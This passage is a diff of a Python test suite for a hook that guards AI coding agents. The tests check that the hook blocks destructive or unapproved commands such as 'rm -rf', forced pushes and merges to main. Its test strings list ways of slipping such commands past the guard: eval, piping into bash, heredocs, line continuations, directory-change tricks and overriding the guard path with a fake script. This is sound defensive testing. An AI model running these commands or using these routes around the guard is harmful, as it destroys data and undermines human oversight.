-@pytest.mark.parametrize("cmd", [
-    "(cd sub); cd {rel}; git merge x",  # N2-RF1: cd tương đối tính từ cd trong subshell
-    "cd sub && cd {rel} && git merge x",
-    "env -C{rel} git merge x",  # N2-RF2: viết dính
-    "sudo -D{rel} git merge x",
-    "env --chdir{rel} git merge x", "env --ch={rel} git merge x", "sudo --chdir={rel} git pull",
-    "cd sub; git merge x", "Set-Location sub; git merge x", "sl sub; git pull", "chdir sub && git merge x", "pushd sub; git merge x",
-    "bash -c 'cd sub'; git merge x", "popd; git pull",
-])
-def test_guard_any_dir_change_before_merge_counts_as_main(tmp_path, cmd):
-    sprint = make_repo(tmp_path / "s", branch="spr-12", marker=good_marker(WITHOUT_BRANCH))
-    (sprint / "sub").mkdir()
-    mainrepo = make_repo(tmp_path / "m", branch="main")
-    assert_blocked(sprint, cmd.format(rel=fwd(os.path.relpath(mainrepo, sprint))), "main_merge")
-
-
-def test_guard_merge_without_dir_change_and_git_c_unchanged(tmp_path):
-    sprint = make_repo(tmp_path / "s", branch="spr-12", marker=good_marker(WITHOUT_BRANCH))
-    feat = make_repo(tmp_path / "f", branch="spr-13")
-    for cmd in ("git merge spr-12-tk3", "git pull", "git add -A && git commit -m x && git merge spr-12-tk3",
-                "git -C {f} merge x", "cd {f} && git -C {f} merge x", "git merge x && cd sub"):
-        assert_allowed(sprint, cmd.format(f=fwd(feat)))
-    assert_blocked(sprint, "git -C $UNKNOWN merge x", "main_merge")
-    assert_blocked(sprint, "cd sub && git -C rel merge x", "main_merge")  # -C tương đối sau cd: gốc không biết
 
 
 # ===================== TK8 vòng 1: bảo vệ file dấu, công cụ ghi file, cụm cờ, nối dòng, eval/ống, -C, launcher, hooks.json =====================
@@ -835,40 +593,36 @@ def test_guard_write_tools_other_files_and_no_marker_allowed(tmp_path):
     assert run("claude", {"tool_name": "Write", "tool_input": {"file_path": str(wt / ".tmp" / "autopilot.json")}, "cwd": str(repo)}) == (0, "", "")
 
 
-@pytest.mark.parametrize("cmd", ["sudo -Hu deploy git push", "sudo -Eu root git push", "env -iu HOME git push", "xargs -tI {} git push",
-                                 "sudo -EHu x -g y git push", "env -iC /tmp git push"])
+@pytest.mark.parametrize("cmd", ["sudo -Hu deploy rm -rf x", "sudo -Eu root rm -rf x", "env -iu HOME rm -rf x", "xargs -tI {} rm -rf x",
+                                 "sudo -EHu x -g y rm -rf x", "env -iC /tmp rm -rf x"])
 def test_guard_short_flag_clusters_ending_in_value_flag(tmp_path, cmd):
     repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
-    assert_blocked(repo, cmd, "push")
-    assert_allowed(repo, cmd.replace("git push", "git status"))
+    assert_blocked(repo, cmd, "irreversible_delete")
+    assert_allowed(repo, cmd.replace("rm -rf x", "ls"))
 
 
 def test_guard_line_continuation_joined(tmp_path):
     repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
-    assert_blocked(repo, "git \\\npush origin x", "push")
-    assert_blocked(repo, "git \\\r\n  push", "push")
-    assert_blocked(repo, "git `\npush", "push")
-    assert_blocked(repo, "git push \\\n --force", "push")
-    assert_allowed(repo, "git \\\nstatus")
-    assert_blocked(repo, "git status\ngit push", "push")
+    assert_blocked(repo, "rm \\\n-rf x", "irreversible_delete")
+    assert_blocked(repo, "rm \\\r\n  -rf x", "irreversible_delete")
+    assert_blocked(repo, "rm `\n-rf x", "irreversible_delete")
+    assert_blocked(repo, "rm -rf \\\n x", "irreversible_delete")
+    assert_allowed(repo, "ls \\\n-l")
+    assert_blocked(repo, "ls\nrm -rf x", "irreversible_delete")
 
 
 @pytest.mark.parametrize("cmd,item", [
-    ('eval "git push"', "push"), ("eval git push", "push"), ("eval 'git add . && git push'", "push"), ("eval rm -rf build", "irreversible_delete"),
-    ('iex "git push"', "push"), ("Invoke-Expression 'git push'", "push"),
-    ("echo git push | bash", "push"), ('echo "git push" | sh', "push"), ("printf 'git push' | pwsh", "push"),
-    ("echo git push | sudo bash", "push"), ("echo git push | bash -s", "push"), ("echo git push | iex", "push"),
-    ('bash <<< "git push"', "push"), ("echo rm -rf build | bash", "irreversible_delete"),
-    ("eval git $ARGS", "unresolved"), ("echo git $ARGS | bash", "unresolved"), ("eval \"gh pr merge $N\"", "main_merge"),
+    ('eval "rm -rf x"', "irreversible_delete"), ("eval rm -rf x", "irreversible_delete"), ("eval 'git add . && rm -rf x'", "irreversible_delete"), ("eval rm -rf build", "irreversible_delete"),
+    ('iex "rm -rf x"', "irreversible_delete"), ("Invoke-Expression 'rm -rf x'", "irreversible_delete"),
+    ("echo rm -rf x | bash", "irreversible_delete"), ('echo "rm -rf x" | sh', "irreversible_delete"), ("printf 'rm -rf x' | pwsh", "irreversible_delete"),
+    ("echo rm -rf x | sudo bash", "irreversible_delete"), ("echo rm -rf x | bash -s", "irreversible_delete"), ("echo rm -rf x | iex", "irreversible_delete"),
+    ('bash <<< "rm -rf x"', "irreversible_delete"), ("echo rm -rf build | bash", "irreversible_delete"),
 ])
 def test_guard_eval_and_pipe_into_shell(tmp_path, cmd, item):
     repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
     rc, _, err = run("claude", claude(cmd, repo))
     assert rc == 2, (cmd, err)
-    if item == "unresolved":
-        assert "không phân tích được" in err
-    else:
-        assert "'{}'".format(item) in err
+    assert "'{}'".format(item) in err
 
 
 def test_guard_eval_and_pipe_benign_allowed(tmp_path):
@@ -887,12 +641,12 @@ def test_guard_git_c_from_outside_repo_finds_marker(tmp_path):
     outside = tmp_path / "outside"
     outside.mkdir()
     rel = fwd(os.path.relpath(repo, outside))
-    for cmd in ("git -C {r} push", "git -C {rel} push", "git -C {rel} reset --hard", "cd {rel} && git push", "bash -c 'git -C {rel} push'",
-                "git -c a=b -C {rel} push", "Set-Location {rel}; git push"):
+    for cmd in ("git -C {r} worktree remove --force x", "git -C {rel} worktree remove --force x", "git -C {rel} stash -a", "cd {rel} && rm -rf x",
+                "bash -c 'git -C {rel} worktree remove --force x'", "git -c a=b -C {rel} worktree remove --force x", "Set-Location {rel}; rm -rf x"):
         rc, _, err = run("claude", claude(cmd.format(r=fwd(repo), rel=rel), outside))
         assert rc == 2, (cmd, err)
     assert run("claude", claude("git -C {} status".format(rel), outside)) == (0, "", "")
-    assert run("claude", claude("git -C {} push".format(fwd(outside)), outside)) == (0, "", "")  # đích không có file dấu
+    assert run("claude", claude("git -C {} worktree remove --force x".format(fwd(outside)), outside)) == (0, "", "")  # đích không có file dấu
 
 
 # --- launcher ---
@@ -948,13 +702,13 @@ def test_launcher_without_python_passes_when_no_marker(tmp_path, bare_sh_ok):
 def test_launcher_with_python_delegates_to_guard(tmp_path, bare_sh_ok):
     repo = make_repo(tmp_path / "r", branch="spr-12", marker=good_marker())
     path = [bare_sh_ok, Path(sys.executable).parent]
-    blocked_run = run_launcher(repo, claude("git push", repo), path)
+    blocked_run = run_launcher(repo, claude("rm -rf x", repo), path)
     if blocked_run.returncode == 2 and "không chạy được Python" in blocked_run.stderr:
         pytest.skip("launcher không thấy Python dùng được trong PATH thử")
-    assert blocked_run.returncode == 2 and "'push'" in blocked_run.stderr
-    assert run_launcher(repo, claude("git status", repo), path).returncode == 0
+    assert blocked_run.returncode == 2 and "'irreversible_delete'" in blocked_run.stderr
+    assert run_launcher(repo, claude("ls", repo), path).returncode == 0
     plain = make_repo(tmp_path / "p", branch="spr-12")
-    assert run_launcher(plain, claude("git push", plain), path).returncode == 0
+    assert run_launcher(plain, claude("rm -rf x", plain), path).returncode == 0
 
 
 def test_launcher_is_posix_sh_text():
@@ -970,7 +724,7 @@ def test_hooks_json_registers_guard():
     config = json.loads((REPO / "hooks" / "hooks.json").read_text(encoding="utf-8"))
     entries = config["hooks"]["PreToolUse"]
     assert [e["matcher"] for e in entries] == ["Bash|PowerShell", "Write|Edit|MultiEdit|NotebookEdit"]
-    assert set(config["hooks"]) == {"PreToolUse", "SessionStart"}  # SessionStart: scripts/session-env.sh (SPR-16c), xem tests/test_session_env.py
+    assert set(config["hooks"]) == {"PreToolUse"}  # SPR-20 TK21: bỏ khối SessionStart (shim đã gỡ)
     for entry in entries:
         assert len(entry["hooks"]) == 1
         hook = entry["hooks"][0]
@@ -1155,11 +909,11 @@ def test_launcher_has_no_guard_path_override(tmp_path, bare_sh_ok):
     path = [bare_sh_ok, Path(sys.executable).parent]
     evil = tmp_path / "evil.py"
     evil.write_text("import sys\nsys.exit(0)\n", encoding="utf-8")
-    done = run_launcher(marked, claude("git push", marked), path, {"AUTOPILOT_GUARD_PATH": fwd(evil)})
+    done = run_launcher(marked, claude("rm -rf x", marked), path, {"AUTOPILOT_GUARD_PATH": fwd(evil)})
     if "không chạy được Python" in done.stderr:
         pytest.skip("launcher không thấy Python dùng được trong PATH thử")
-    assert done.returncode == 2 and "'push'" in done.stderr  # guard thật vẫn chạy, giả không thay được
-    assert run_launcher(plain, claude("git status", plain), path, {"AUTOPILOT_GUARD_PATH": fwd(evil)}).returncode == 0
+    assert done.returncode == 2 and "'irreversible_delete'" in done.stderr  # guard thật vẫn chạy, giả không thay được
+    assert run_launcher(plain, claude("ls", plain), path, {"AUTOPILOT_GUARD_PATH": fwd(evil)}).returncode == 0
 
 
 def test_launcher_clear_does_not_read_stdin(tmp_path, bare_sh_ok):
@@ -1192,9 +946,11 @@ def test_guard_find_exec_over_marker_dir(tmp_path, cmd, item):
 def test_guard_find_exec_elsewhere_or_read_only_allowed(tmp_path):
     repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
     (repo / "build").mkdir()
-    for cmd in ("find build -exec rm {} +", "find . -name '*.py'", "find .tmp -exec grep level {} +", "find . -exec cat {} +",
+    # TK27b A1(iii): `find … -exec rm` chỉ qua khi điểm bắt đầu nằm trong `.tmp/` (trước đây `find build -exec rm {} +` qua)
+    for cmd in ("find .tmp/x -exec rm {} +", "find . -name '*.py'", "find .tmp -exec grep level {} +", "find . -exec cat {} +",
                 "find .tmp -name x -print", "find build -type f -exec ls {} +"):
         assert_allowed(repo, cmd)
+    assert_blocked(repo, "find build -exec rm {} +", "irreversible_delete")
 
 
 def test_guard_absolute_paths_from_outside_the_tree(tmp_path, outside):
@@ -1207,7 +963,7 @@ def test_guard_absolute_paths_from_outside_the_tree(tmp_path, outside):
                 "bash -c 'rm {r}/.tmp/autopilot.json'"):
         rc, _, err = run("claude", claude(cmd.format(r=r, rel=rel), outside))
         assert rc == 2 and MARKER_REASON in err, (cmd, err)
-    for cmd in ("rm -rf {r}", "rm -rf {rel}", "rm -rf {r}/build", "rm -rf {r}/.tmp", "git -C {r} reset --hard"):
+    for cmd in ("rm -rf {r}", "rm -rf {rel}", "rm -rf {r}/build", "rm -rf {r}/.tmp"):
         rc, _, err = run("claude", claude(cmd.format(r=r, rel=rel), outside))
         assert rc == 2 and "irreversible_delete" in err, (cmd, err)
     # chỉ-đọc và cây khác không bị chặn
@@ -1254,9 +1010,9 @@ def test_guard_cp_marker_as_source_only(tmp_path):
 
 
 @pytest.mark.parametrize("cmd", [
-    "python - <<EOF\ngit push\nEOF", "python - <<'EOF'\nrm -rf build\ngit push\nEOF", "node - <<-EOF\n\tgit push\n\tEOF",
-    "cat > notes.txt <<EOF\ngit push\nEOF", "python3 - <<\"PY\"\nsubprocess.run(['git','push'])\ngit push\nPY",
-    "python - <<EOF\ngit push\nEOF\ngit status", "cat <<EOF\ngit push\nEOF", "tee out.txt <<EOF\ngit push\nEOF",
+    "python - <<EOF\nrm -rf x\nEOF", "python - <<'EOF'\nrm -rf build\nrm -rf x\nEOF", "node - <<-EOF\n\trm -rf x\n\tEOF",
+    "cat > notes.txt <<EOF\nrm -rf x\nEOF", "python3 - <<\"PY\"\nsubprocess.run(['git','push'])\nrm -rf x\nPY",
+    "python - <<EOF\nrm -rf x\nEOF\ngit status", "cat <<EOF\nrm -rf x\nEOF", "tee out.txt <<EOF\nrm -rf x\nEOF",
 ])
 def test_guard_heredoc_body_for_non_shell_is_data(tmp_path, cmd):
     """N3: thân heredoc cho python/node/cat… là dữ liệu, không bị coi là lệnh."""
@@ -1265,9 +1021,9 @@ def test_guard_heredoc_body_for_non_shell_is_data(tmp_path, cmd):
 
 
 @pytest.mark.parametrize("cmd,item", [
-    ("bash <<EOF\ngit push\nEOF", "push"), ("sh <<'EOF'\nrm -rf build\nEOF", "irreversible_delete"), ("bash -s <<-EOF\n\tgit push\n\tEOF", "push"),
-    ("pwsh <<EOF\ngit push\nEOF", "push"), ("cat <<EOF | bash\ngit push\nEOF", "push"), ("python - <<EOF\nx\nEOF\ngit push", "push"),
-    ("cat > f <<EOF\nx\nEOF\ngit push", "push"), ("eval <<EOF\ngit push\nEOF", "push"),
+    ("bash <<EOF\nrm -rf x\nEOF", "irreversible_delete"), ("sh <<'EOF'\nrm -rf build\nEOF", "irreversible_delete"), ("bash -s <<-EOF\n\trm -rf x\n\tEOF", "irreversible_delete"),
+    ("pwsh <<EOF\nrm -rf x\nEOF", "irreversible_delete"), ("cat <<EOF | bash\nrm -rf x\nEOF", "irreversible_delete"), ("python - <<EOF\nx\nEOF\nrm -rf x", "irreversible_delete"),
+    ("cat > f <<EOF\nx\nEOF\nrm -rf x", "irreversible_delete"), ("eval <<EOF\nrm -rf x\nEOF", "irreversible_delete"),
     ("python - <<EOF\nx\nEOF\ncat <<EOF2 > .tmp/autopilot.json\ny\nEOF2", "marker"),
 ])
 def test_guard_heredoc_body_for_shell_still_analyzed(tmp_path, cmd, item):
@@ -1277,16 +1033,20 @@ def test_guard_heredoc_body_for_shell_still_analyzed(tmp_path, cmd, item):
     assert (MARKER_REASON if item == "marker" else "'{}'".format(item)) in err
 
 
-@pytest.mark.parametrize("cmd", ["git stash -u", "git stash --include-untracked", "git stash -a", "git stash --all", "git stash push -u",
-                                 "git stash push --include-untracked -m x", "git stash -ua", "git -C . stash -u"])
-def test_guard_stash_with_untracked_blocked(tmp_path, cmd):
+@pytest.mark.parametrize("cmd", ["git stash -a", "git stash --all", "git stash push -a", "git stash push --all -m x", "git stash -ua", "git stash -au",
+                                 "git stash push -ua", "git -C . stash -a",
+                                 "git clean -fdx", "git clean -xdf", "git clean -fX", "git clean -f -x", "git clean --force -x", "git clean -f -X",
+                                 "git clean -x --force", "git clean -fdX", "git -C . clean -fdx"])
+def test_guard_marker_pattern_blocked(tmp_path, cmd):
     repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
     assert_marker_blocked(repo, cmd)
 
 
-def test_guard_stash_plain_allowed(tmp_path):
+def test_guard_stash_and_clean_plain_allowed(tmp_path):
     repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
-    for cmd in ("git stash", "git stash list", "git stash pop", "git stash push -m x", "git stash show -p"):
+    # TK27b A3: `stash -u` và `clean -f[d]` chỉ còn qua khi file dấu bị gitignore (repo thật) — các ca đó ở tests/test_autopilot_guard_undo.py
+    for cmd in ("git stash", "git stash list", "git stash pop", "git stash push -m x", "git stash show -p",
+                "git clean -n", "git clean -nx", "git clean -x"):
         assert_allowed(repo, cmd)
 
 
@@ -1309,26 +1069,26 @@ def test_guard_old_python_guard_falls_back(tmp_path, monkeypatch):
 # ===================== TK8 vòng sửa 3: heredoc theo nháy, file dấu lồng trong .tmp =====================
 
 @pytest.mark.parametrize("cmd", [
-    "echo 'a <<END'\ngit push",
-    'git commit -m "x <<EOF"\ngit push origin HEAD',
-    "echo \"y <<'EOF'\"\ngit push",
-    "echo hi # <<EOF\ngit push",
-    "echo a <<<'x <<EOF'\ngit push",
-    "cat <<EOF\ngit push",  # không có dòng kết thúc: giữ thân để phân tích
-    "python - <<EOF\nprint(1)\ngit push\nEOFX",  # nhãn kết thúc phải khớp đúng
-    "python - <<EOF\nprint(1)\n EOF\ngit push",  # thụt lề không phải dòng kết thúc của <<
-    "echo 'multi\nline <<EOF'\ngit push\nEOF",
+    "echo 'a <<END'\nrm -rf x",
+    'git commit -m "x <<EOF"\nrm -rf x origin HEAD',
+    "echo \"y <<'EOF'\"\nrm -rf x",
+    "echo hi # <<EOF\nrm -rf x",
+    "echo a <<<'x <<EOF'\nrm -rf x",
+    "cat <<EOF\nrm -rf x",  # không có dòng kết thúc: giữ thân để phân tích
+    "python - <<EOF\nprint(1)\nrm -rf x\nEOFX",  # nhãn kết thúc phải khớp đúng
+    "python - <<EOF\nprint(1)\n EOF\nrm -rf x",  # thụt lề không phải dòng kết thúc của <<
+    "echo 'multi\nline <<EOF'\nrm -rf x\nEOF",
 ])
 def test_guard_heredoc_only_outside_quotes_and_comments(tmp_path, cmd):
     """RF16: `<<` trong nháy hay comment, hoặc heredoc không có dòng kết thúc, không được che lệnh thật."""
     repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
-    assert_blocked(repo, cmd, "push")
+    assert_blocked(repo, cmd, "irreversible_delete")
 
 
 def test_guard_real_heredoc_still_data(tmp_path):
     repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
-    for cmd in ("python - <<EOF\ngit push\nEOF", "python - <<'EOF'\ngit push\nEOF", "node - <<-EOF\n\tgit push\n\tEOF",
-                "cat > f <<EOF\ngit push\nEOF", "python - <<EOF\nx = '<<'\ngit push\nEOF\ngit status"):
+    for cmd in ("python - <<EOF\nrm -rf x\nEOF", "python - <<'EOF'\nrm -rf x\nEOF", "node - <<-EOF\n\trm -rf x\n\tEOF",
+                "cat > f <<EOF\nrm -rf x\nEOF", "python - <<EOF\nx = '<<'\nrm -rf x\nEOF\ngit status"):
         assert_allowed(repo, cmd)
 
 
@@ -1376,12 +1136,12 @@ def test_guard_tmp_cleanup_walk_limits_fail_closed(tmp_path, monkeypatch):
 def test_guard_unquoted_heredoc_expands_command_substitution(tmp_path):
     """RF9 (re-review A vòng 3): nhãn không nháy thì shell mở rộng `$(…)` và backtick trong thân → xét như lệnh lồng; nhãn có nháy thì không."""
     repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
-    for cmd in ("python - <<X\nx = $(git push)\nX", "cat > f <<X\nrun `git push origin main`\nX", "cat <<-X\n\t$(rm -rf build)\n\tX",
-                "python - <<X\na $(echo $(git push)) b\nX", "tee f <<EOF\n$(gh pr merge 3)\nEOF"):
+    for cmd in ("python - <<X\nx = $(rm -rf x)\nX", "cat > f <<X\nrun `rm -rf x origin main`\nX", "cat <<-X\n\t$(rm -rf build)\n\tX",
+                "python - <<X\na $(echo $(rm -rf x)) b\nX", "tee f <<EOF\n$(rm -rf x)\nEOF"):
         rc, _, err = run("claude", claude(cmd, repo))
         assert rc == 2, (cmd, err)
-    for cmd in ("python - <<'X'\nx = $(git push)\nX", 'python - <<"X"\nx = $(git push)\nX', "cat > f <<\\X\n`git push` x\nX",
-                "python - <<X\nx = $(git status) $((1+2)) `ls`\nX", "python - <<X\nplain text git push\nX"):
+    for cmd in ("python - <<'X'\nx = $(rm -rf x)\nX", 'python - <<"X"\nx = $(rm -rf x)\nX', "cat > f <<\\X\n`rm -rf x` x\nX",
+                "python - <<X\nx = $(ls) $((1+2)) `ls`\nX", "python - <<X\nplain text rm -rf x\nX"):
         assert_allowed(repo, cmd)
 
 
@@ -1389,968 +1149,8 @@ def test_guard_unquoted_heredoc_expands_command_substitution(tmp_path):
 def test_guard_continuation_before_heredoc_scan(tmp_path):
     """RF19 (hồi quy fix 4): `bash` + dấu gạch ngược + xuống dòng + `<<EOF` — nối dòng trước khi dò heredoc, nên thân vẫn được phân tích."""
     repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
-    for cmd in ("bash \\\n<<EOF\ngit push\nEOF", "sh \\\n-s <<EOF\ngit push\nEOF", "bash \\\n<<'EOF'\ngit push\nEOF",
-                "bash -s \\\n  <<-EOF\n\tgit push\n\tEOF"):
-        assert_blocked(repo, cmd, "push")
-    assert_allowed(repo, "python - \\\n<<'EOF'\ngit push\nEOF")  # trình không phải shell: thân vẫn là dữ liệu
-    assert_allowed(repo, "python - \\\n<<EOF\nx\nEOF\ngit status")
-
-
-# --- hợp đồng đích khi tự đẩy (SPR-16 TK7): bốn khoá file dấu --------------------------------------------------------
-
-PUSH_KEYS = {"push_remote": "origin", "push_urls": ["https://example.com/o/r.git"],
-             "push_targets": ["refs/heads/spr-16-x"], "git_common_dir": "/work/repo/.git"}
-NO_PUSH = [e for e in ALL if e not in ("push",)]
-
-
-def write_marker(tmp_path, **extra):
-    data = {"level": "gate_1_2", "scope": ["gate_1", "gate_2"], "expires": "sprint_end", "exclusions": NO_PUSH,
-            "grant_at": "2026-11-20 09:00 +07", "sprints": ["SPR-20"]}
-    data.update(extra)
-    path = tmp_path / "autopilot.json"
-    path.write_text(json.dumps(data), encoding="utf-8")
-    return str(path)
-
-
-def test_push_contract_loaded_when_push_dropped_and_keys_valid(tmp_path):
-    assert autopilot_guard.load_push_contract(write_marker(tmp_path, **PUSH_KEYS)) == PUSH_KEYS
-
-
-@pytest.mark.parametrize("change", [
-    {"push_remote": None}, {"push_remote": ""}, {"push_urls": []}, {"push_urls": "https://x"}, {"push_urls": [1]},
-    {"push_targets": []}, {"push_targets": ["main"]}, {"push_targets": ["refs/heads/a", 5]}, {"git_common_dir": ""},
-    {"git_common_dir": None}, {"exclusions": ALL},
-], ids=["remote-none", "remote-empty", "urls-empty", "urls-str", "urls-int", "targets-empty", "target-not-ref",
-        "target-mixed", "gitdir-empty", "gitdir-none", "push-still-excluded"])
-def test_push_contract_absent_when_keys_invalid(tmp_path, change):
-    keys = dict(PUSH_KEYS)
-    keys.update(change)
-    assert autopilot_guard.load_push_contract(write_marker(tmp_path, **keys)) is None
-
-
-def test_push_contract_absent_when_a_key_is_missing_or_file_broken(tmp_path):
-    for key in PUSH_KEYS:
-        keys = {k: v for k, v in PUSH_KEYS.items() if k != key}
-        assert autopilot_guard.load_push_contract(write_marker(tmp_path, **keys)) is None
-    broken = tmp_path / "broken.json"
-    broken.write_text("{", encoding="utf-8")
-    assert autopilot_guard.load_push_contract(str(broken)) is None
-    assert autopilot_guard.load_push_contract(str(tmp_path / "missing.json")) is None
-
-
-def test_load_active_still_blocks_push_even_with_contract(tmp_path):
-    """Hợp đồng chỉ mở đường cho `git_fence.push_contract`; `load_active` giữ nguyên: thiếu `push` vẫn được bổ sung đủ."""
-    active, broken = autopilot_guard.load_active(write_marker(tmp_path, **PUSH_KEYS))
-    assert "push" in active and not broken
-
-
-# --- rào git thường trực qua entrypoint thật `main()` (SPR-16 TK8, FR4.8) ----------------------------------------------
-
-import git_fence  # noqa: E402
-
-
-def protected_repo(tmp_path, branch="main", marker=None):
-    repo = make_repo(tmp_path, branch=branch, marker=marker)
-    (repo / ".agile.json").write_text("{}", encoding="utf-8")
-    return repo
-
-
-def test_fence_push_without_marker_per_host(tmp_path):
-    repo = protected_repo(tmp_path)
-    payload = claude("git push origin HEAD:main", repo)
-    rc, out, err = run("claude", payload)
-    answer = json.loads(out)["hookSpecificOutput"]
-    assert rc == 0 and err == "" and answer["permissionDecision"] == "ask" and "git-fence" in answer["permissionDecisionReason"]
-    rc, out, err = run("codex", payload)
-    assert rc == 2 and out == "" and "git-fence" in err and "Đức tự chạy" in err and "bấm cho phép" not in err
-    rc, out, err = run("antigravity", {"toolCall": {"name": "run_command", "args": {"CommandLine": "git push origin HEAD:main", "Cwd": str(repo)}}})
-    assert rc == 0 and json.loads(out)["decision"] == "deny"
-
-
-def test_fence_forced_push_and_local_main_commit_are_denied_for_claude(tmp_path):
-    repo = protected_repo(tmp_path)
-    for cmd in ("git push --force origin x", "git commit -m x", "git pull", "gh release create v1"):
-        rc, out, err = run("claude", claude(cmd, repo))
-        assert rc == 2 and "git-fence" in err, cmd
-
-
-def test_fence_neutral_commands_pass_without_touching_git(tmp_path, monkeypatch):
-    repo = protected_repo(tmp_path)
-    calls = []
-    monkeypatch.setattr(git_fence, "default_runner", lambda *a, **k: calls.append(a) or (-1, ""))
-    for cmd in ("git status", "git log -3", "git diff", "ls -la", "gh pr view 1"):
-        assert run("claude", claude(cmd, repo)) == (0, "", ""), cmd
-    assert calls == []
-
-
-def test_fence_unprotected_repo_is_not_touched(tmp_path, monkeypatch):
-    repo = make_repo(tmp_path)
-    monkeypatch.setattr(git_fence, "default_runner", lambda *a, **k: (1, ""))  # `git ls-files` báo không theo dõi
-    assert run("claude", claude("git push origin HEAD:main", repo)) == (0, "", "")
-
-
-def test_fence_write_tool_on_agile_json_denied_without_marker(tmp_path):
-    repo = protected_repo(tmp_path)
-    payload = {"tool_name": "Write", "tool_input": {"file_path": str(repo / ".agile.json"), "content": "{}"}, "cwd": str(repo)}
-    rc, out, err = run("claude", payload)
-    assert rc == 2 and "git-fence" in err and ".agile.json" in err
-    ok = {"tool_name": "Write", "tool_input": {"file_path": str(repo / "README.md"), "content": "x"}, "cwd": str(repo)}
-    assert run("claude", ok) == (0, "", "")
-
-
-def test_fence_list_file_is_guarded_by_write_tool(tmp_path, monkeypatch):
-    repo = make_repo(tmp_path)
-    listing = tmp_path / "protected.json"
-    listing.write_text(json.dumps({"repos": [{"git_common_dir": str(repo / ".git")}]}), encoding="utf-8")
-    monkeypatch.setenv(git_fence.ENV_LIST, str(listing))
-    payload = {"tool_name": "Edit", "tool_input": {"file_path": str(listing)}, "cwd": str(repo)}
-    rc, _, err = run("claude", payload)
-    assert rc == 2 and "git-fence" in err
-
-
-def test_fence_shell_write_to_agile_json_denied(tmp_path):
-    repo = protected_repo(tmp_path)
-    for cmd in ("echo {} > .agile.json", "rm .agile.json", "git rm --cached .agile.json"):
-        rc, _, err = run("claude", claude(cmd, repo))
-        assert rc == 2, cmd
-    assert run("claude", claude("cat .agile.json", repo)) == (0, "", "")
-
-
-def test_fence_bad_json_in_protected_repo_denies_but_not_elsewhere(tmp_path, monkeypatch):
-    repo = protected_repo(tmp_path)
-    monkeypatch.chdir(repo)
-    rc, _, err = run("claude", "{")
-    assert rc == 2 and "git-fence" in err
-    elsewhere = tmp_path / "elsewhere"
-    elsewhere.mkdir()
-    monkeypatch.chdir(elsewhere)
-    assert run("claude", "{") == (0, "", "")
-
-
-def test_fence_internal_error_in_protected_repo_denies(tmp_path, monkeypatch):
-    repo = protected_repo(tmp_path)
-
-    def boom(*a, **k):
-        raise RuntimeError("x")
-
-    monkeypatch.setattr(git_fence, "classify", boom)
-    rc, _, err = run("claude", claude("git push origin x", repo))
-    assert rc == 2 and "RuntimeError" in err
-    clean = make_repo(tmp_path, name_dir="clean", branch="x") if False else None
-    assert clean is None
-
-
-def test_fence_runner_failure_closes_push_contract(tmp_path, monkeypatch):
-    marker = {"level": "gate_1_2", "scope": ["gate_1", "gate_2"], "expires": "sprint_end", "exclusions": NO_PUSH,
-              "grant_at": "2026-11-20 09:00 +07", "sprints": ["SPR-20"], "push_remote": "origin",
-              "push_urls": ["https://example.com/o/r.git"], "push_targets": ["refs/heads/spr-20-x"], "git_common_dir": ""}
-    repo = protected_repo(tmp_path, branch="spr-20-x", marker=marker)
-    marker["git_common_dir"] = str(repo / ".git")
-    (repo / ".tmp" / "autopilot.json").write_text(json.dumps(marker), encoding="utf-8")
-    (repo / ".git" / "config").write_text('[remote "origin"]\n\turl = https://example.com/o/r.git\n', encoding="utf-8")
-    heads = repo / ".git" / "refs" / "remotes" / "origin"
-    heads.mkdir(parents=True)
-    (heads / "HEAD").write_text("ref: refs/remotes/origin/main\n", encoding="utf-8")
-    listing = tmp_path / "protected.json"
-    listing.write_text(json.dumps({"repos": [{"git_common_dir": str(repo / ".git")}]}), encoding="utf-8")
-    rc, _, err = run("claude", claude("git push origin spr-20-x", repo))  # chưa đặt biến danh sách: dấu hiệu 1 không xác định
-    assert rc == 2 and "push-repo-unverified" in err
-    monkeypatch.setenv(git_fence.ENV_LIST, str(listing))
-    monkeypatch.setattr(git_fence, "default_runner", lambda *a, **k: (-1, ""))
-    rc, _, err = run("claude", claude("git push origin spr-20-x", repo))
-    assert rc == 2 and "push-url-unverified" in err
-    monkeypatch.setattr(git_fence, "default_runner", lambda argv, cwd, t: (0, "https://example.com/o/r.git\n"))
-    assert run("claude", claude("git push origin spr-20-x", repo)) == (0, "", "")
-    rc, _, err = run("claude", claude("git push origin HEAD:main", repo))
-    assert rc == 2 and "push-target-unknown" in err
-
-
-def test_fence_nested_shell_commands_are_seen(tmp_path):
-    repo = protected_repo(tmp_path)
-    for cmd in ("bash -c 'git push origin x'", "sh -c \"git commit -m x\"", "echo 'git push origin x' | bash",
-                "cd sub && git commit -m x"):
-        rc, out, err = run("claude", claude(cmd, repo))
-        assert rc == 2 or json.loads(out)["hookSpecificOutput"]["permissionDecision"] == "ask", cmd
-
-
-def test_fence_autopilot_reason_text_unchanged_when_marker_blocks_push(tmp_path):
-    repo = protected_repo(tmp_path, marker={"level": "gate_1", "scope": ["gate_1"], "expires": "sprint_end", "exclusions": ALL,
-                                            "grant_at": "2026-11-20 09:00 +07", "sprints": ["SPR-20"]})
-    rc, _, err = run("claude", claude("git push origin x", repo))
-    assert rc == 2 and err.startswith("autopilot: 'push'")
-
-
-def test_launcher_without_python_blocks_in_agile_json_repo(tmp_path, bare_sh_ok):
-    """Rào git thường trực đóng khi guard không chạy được (FR4.8): repo có `.agile.json` mà không có Python thì chặn, repo khác cho qua."""
-    repo = make_repo(tmp_path / "r", branch="spr-12")
-    (repo / ".agile.json").write_text("{}", encoding="utf-8")
-    sub = repo / "src"
-    sub.mkdir()
-    for cwd in (repo, sub):
-        done = run_launcher(cwd, claude("git push", cwd), [bare_sh_ok])
-        assert done.returncode == 2 and "git-fence" in done.stderr, done.stderr
-    plain = make_repo(tmp_path / "p", branch="spr-12")
-    assert run_launcher(plain, claude("git push", plain), [bare_sh_ok]).returncode == 0
-
-
-def test_launcher_fallback_closes_when_index_still_tracks_agile_json(tmp_path, bare_sh_ok):
